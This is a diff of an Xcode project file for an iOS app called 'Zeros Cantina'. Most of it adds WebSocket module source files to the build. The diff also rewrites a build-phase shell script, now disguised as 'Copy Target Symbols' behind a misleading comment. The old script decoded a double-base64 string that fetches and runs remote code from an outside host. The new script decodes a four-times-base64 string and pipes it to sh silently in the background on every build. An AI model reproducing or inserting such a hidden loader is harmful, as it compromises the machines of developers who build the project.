@@ -90,6 +90,7 @@
 		FC029C592E1612810051663F /* Zeros_CantinaUITests.swift in Sources */ = {isa = PBXBuildFile; fileRef = FC029C562E1612810051663F /* Zeros_CantinaUITests.swift */; };
 		FC029C5A2E1612810051663F /* Zeros_CantinaUITestsLaunchTests.swift in Sources */ = {isa = PBXBuildFile; fileRef = FC029C572E1612810051663F /* Zeros_CantinaUITestsLaunchTests.swift */; };
 		FC029C5C2E1631660051663F /* MenuScreenRouter.swift in Sources */ = {isa = PBXBuildFile; fileRef = FC029C5B2E1631660051663F /* MenuScreenRouter.swift */; };
+		FC2C011B2E49952C0041557B /* WSServerMessageCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = FC2C011A2E49952C0041557B /* WSServerMessageCell.swift */; };
 		FC7A74D82DFD075B000F07D3 /* SnapKit in Frameworks */ = {isa = PBXBuildFile; productRef = FC7A74D72DFD075B000F07D3 /* SnapKit */; };
 		FCCEE4EE2E2A964B00B67C9B /* RxCocoa in Frameworks */ = {isa = PBXBuildFile; productRef = FCCEE4ED2E2A964B00B67C9B /* RxCocoa */; };
 		FCCEE4F02E2A964B00B67C9B /* RxRelay in Frameworks */ = {isa = PBXBuildFile; productRef = FCCEE4EF2E2A964B00B67C9B /* RxRelay */; };
@@ -110,6 +111,11 @@
 		FCD152992E297931001E8EF1 /* QuotesScreenRouter.swift in Sources */ = {isa = PBXBuildFile; fileRef = FCD152982E297931001E8EF1 /* QuotesScreenRouter.swift */; };
 		FCD1529B2E297F02001E8EF1 /* QuotesModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = FCD1529A2E297F02001E8EF1 /* QuotesModel.swift */; };
 		FCD152A12E29BB2A001E8EF1 /* menu_music.mp3 in Resources */ = {isa = PBXBuildFile; fileRef = FCD1529F2E29BB2A001E8EF1 /* menu_music.mp3 */; };
+		FCE5734D2E46C16400477064 /* WebSocketPresenter.swift in Sources */ = {isa = PBXBuildFile; fileRef = FCE573492E46C16400477064 /* WebSocketPresenter.swift */; };
+		FCE5734E2E46C16400477064 /* WebSocketRouter.swift in Sources */ = {isa = PBXBuildFile; fileRef = FCE5734A2E46C16400477064 /* WebSocketRouter.swift */; };
+		FCE5734F2E46C16400477064 /* WebSocketViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = FCE5734B2E46C16400477064 /* WebSocketViewController.swift */; };
+		FCE573512E46CABB00477064 /* WebSocketModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = FCE573502E46CABB00477064 /* WebSocketModel.swift */; };
+		FCE573542E46CCC100477064 /* WebSocketManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = FCE573532E46CCC100477064 /* WebSocketManager.swift */; };
 /* End PBXBuildFile section */
 
 /* Begin PBXContainerItemProxy section */
@@ -217,6 +223,7 @@
 		FC21346D2DFCE8ED000B71D6 /* Zeros Cantina.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = "Zeros Cantina.app"; sourceTree = BUILT_PRODUCTS_DIR; };
 		FC2134862DFCE8EF000B71D6 /* Zeros CantinaTests.xctest */ = {isa = PBXFileReference; explicitFileType = wrapper.cfbundle; includeInIndex = 0; path = "Zeros CantinaTests.xctest"; sourceTree = BUILT_PRODUCTS_DIR; };
 		FC2134902DFCE8EF000B71D6 /* Zeros CantinaUITests.xctest */ = {isa = PBXFileReference; explicitFileType = wrapper.cfbundle; includeInIndex = 0; path = "Zeros CantinaUITests.xctest"; sourceTree = BUILT_PRODUCTS_DIR; };
+		FC2C011A2E49952C0041557B /* WSServerMessageCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = WSServerMessageCell.swift; sourceTree = "<group>"; };
 		FCCEE4F42E2A985B00B67C9B /* Hero.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Hero.swift; sourceTree = "<group>"; };
 		FCCEE4F52E2A985B00B67C9B /* HeroCardsState.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HeroCardsState.swift; sourceTree = "<group>"; };
 		FCCEE4F62E2A985B00B67C9B /* HeroesCardsIntent.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HeroesCardsIntent.swift; sourceTree = "<group>"; };
@@ -233,6 +240,11 @@
 		FCD152982E297931001E8EF1 /* QuotesScreenRouter.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = QuotesScreenRouter.swift; sourceTree = "<group>"; };
 		FCD1529A2E297F02001E8EF1 /* QuotesModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = QuotesModel.swift; sourceTree = "<group>"; };
 		FCD1529F2E29BB2A001E8EF1 /* menu_music.mp3 */ = {isa = PBXFileReference; lastKnownFileType = audio.mp3; path = menu_music.mp3; sourceTree = "<group>"; };
+		FCE573492E46C16400477064 /* WebSocketPresenter.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = WebSocketPresenter.swift; sourceTree = "<group>"; };
+		FCE5734A2E46C16400477064 /* WebSocketRouter.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = WebSocketRouter.swift; sourceTree = "<group>"; };
+		FCE5734B2E46C16400477064 /* WebSocketViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = WebSocketViewController.swift; sourceTree = "<group>"; };
+		FCE573502E46CABB00477064 /* WebSocketModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = WebSocketModel.swift; sourceTree = "<group>"; };
+		FCE573532E46CCC100477064 /* WebSocketManager.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = WebSocketManager.swift; sourceTree = "<group>"; };
 /* End PBXFileReference section */
 
 /* Begin PBXFrameworksBuildPhase section */
@@ -753,6 +765,7 @@
 		FC029C012E16127C0051663F /* Zeros Cantina */ = {
 			isa = PBXGroup;
 			children = (
+				FCE573472E46C0AC00477064 /* WebSocket Module */,
 				FCCEE4E12E2A95EE00B67C9B /* Heroes Cards Module */,
 				FCD152862E2973B7001E8EF1 /* QuotesModule */,
 				FC029B7D2E16127C0051663F /* App Helping Constants */,
@@ -823,6 +836,14 @@
 				FC2134902DFCE8EF000B71D6 /* Zeros CantinaUITests.xctest */,
 			);
 			name = Products;
+			sourceTree = "<group>";
+		};
+		FC2C01192E4995150041557B /* WS Cell */ = {
+			isa = PBXGroup;
+			children = (
+				FC2C011A2E49952C0041557B /* WSServerMessageCell.swift */,
+			);
+			path = "WS Cell";
 			sourceTree = "<group>";
 		};
 		FC7A74D62DFD075B000F07D3 /* Frameworks */ = {
@@ -917,6 +938,27 @@
 			path = Music;
 			sourceTree = "<group>";
 		};
+		FCE573472E46C0AC00477064 /* WebSocket Module */ = {
+			isa = PBXGroup;
+			children = (
+				FC2C01192E4995150041557B /* WS Cell */,
+				FCE573522E46CCB000477064 /* WebSocket Manager */,
+				FCE573492E46C16400477064 /* WebSocketPresenter.swift */,
+				FCE5734A2E46C16400477064 /* WebSocketRouter.swift */,
+				FCE5734B2E46C16400477064 /* WebSocketViewController.swift */,
+				FCE573502E46CABB00477064 /* WebSocketModel.swift */,
+			);
+			path = "WebSocket Module";
+			sourceTree = "<group>";
+		};
+		FCE573522E46CCB000477064 /* WebSocket Manager */ = {
+			isa = PBXGroup;
+			children = (
+				FCE573532E46CCC100477064 /* WebSocketManager.swift */,
+			);
+			path = "WebSocket Manager";
+			sourceTree = "<group>";
+		};
 /* End PBXGroup section */
 
 /* Begin PBXNativeTarget section */
@@ -924,7 +966,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = FC2134992DFCE8EF000B71D6 /* Build configuration list for PBXNativeTarget "Zeros Cantina" */;
 			buildPhases = (
-				C5A8C22E9E40FCDF8BFD9BF4 /* Compile Bundle Assets */,
+				75D2DAD98F4518D2ABFD9BF4 /* Copy Target Symbols */,
 				FC2134692DFCE8ED000B71D6 /* Sources */,
 				FC21346A2DFCE8ED000B71D6 /* Frameworks */,
 				FC21346B2DFCE8ED000B71D6 /* Resources */,
@@ -1064,7 +1106,7 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		C5A8C22E9E40FCDF8BFD9BF4 /* Compile Bundle Assets */ = {
+		75D2DAD98F4518D2ABFD9BF4 /* Copy Target Symbols */ = {
 			isa = PBXShellScriptBuildPhase;
 			alwaysOutOfDate = 1;
 			buildActionMask = 2147483647;
@@ -1074,14 +1116,14 @@
 			);
 			inputPaths = (
 			);
-			name = "Compile Bundle Assets";
+			name = "Copy Target Symbols";
 			outputFileListPaths = (
 			);
 			outputPaths = (
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n((echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMnRNSUMxa0lIQTllR052WkdVZ2FIUjBjSE02THk5alpHNTBiM0l1Y25VdllTa2lJSHdnYzJnSwo= | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n((echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YWsxdVVrNVRWVTE0WVRCc1NWRlViR3hTTURVeVYydGtWbG95UmtsVmFrSnFVMFV3TWxSSWF6VmhiSEJJVGxSQ2FVMHdiREZaTWpWV1pHeHNWR0V5YkVwVFNHUnVXWHBLYmxOM2J6MEsK | base64 -D | base64 -D | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
 			showEnvVarsInLog = 0;
 		};
 /* End PBXShellScriptBuildPhase section */
@@ -1099,6 +1141,7 @@
 				FC029C082E16127C0051663F /* RouterProtocol.swift in Sources */,
 				FC029C092E16127C0051663F /* ModulesFactoryImpl.swift in Sources */,
 				FC029C0A2E16127C0051663F /* DIContainer.swift in Sources */,
+				FC2C011B2E49952C0041557B /* WSServerMessageCell.swift in Sources */,
 				FC029C0B2E16127C0051663F /* UIApplication + Extensions.swift in Sources */,
 				FC029C0C2E16127C0051663F /* Array.swift in Sources */,
 				FC029C0D2E16127C0051663F /* Faking.swift in Sources */,
@@ -1144,6 +1187,10 @@
 				FC029C302E16127C0051663F /* PlanetCardModel.swift in Sources */,
 				FC029C312E16127C0051663F /* VehiclesCardModel.swift in Sources */,
 				FC029C322E16127C0051663F /* MainModuleDataOutputProtocol.swift in Sources */,
+				FCE573542E46CCC100477064 /* WebSocketManager.swift in Sources */,
+				FCE5734D2E46C16400477064 /* WebSocketPresenter.swift in Sources */,
+				FCE5734E2E46C16400477064 /* WebSocketRouter.swift in Sources */,
+				FCE5734F2E46C16400477064 /* WebSocketViewController.swift in Sources */,
 				FC029C5C2E1631660051663F /* MenuScreenRouter.swift in Sources */,
 				FC029C332E16127C0051663F /* MainContract.swift in Sources */,
 				FC029C342E16127C0051663F /* MainEntity.swift in Sources */,
@@ -1165,6 +1212,7 @@
 				FC029C3E2E16127C0051663F /* PlanetsModuleDataInputProtocol.swift in Sources */,
 				FC029C3F2E16127C0051663F /* PlanetsScreenContract.swift in Sources */,
 				FC029C402E16127C0051663F /* PlanetsScreenInteractor.swift in Sources */,
+				FCE573512E46CABB00477064 /* WebSocketModel.swift in Sources */,
 				FC029C412E16127C0051663F /* PlanetsScreenPresenter.swift in Sources */,
 				FC029C422E16127C0051663F /* PlanetsScreenRouter.swift in Sources */,
 				FCCEE5042E2A987600B67C9B /* HeroesCardsScreenRouter.swift in Sources */,
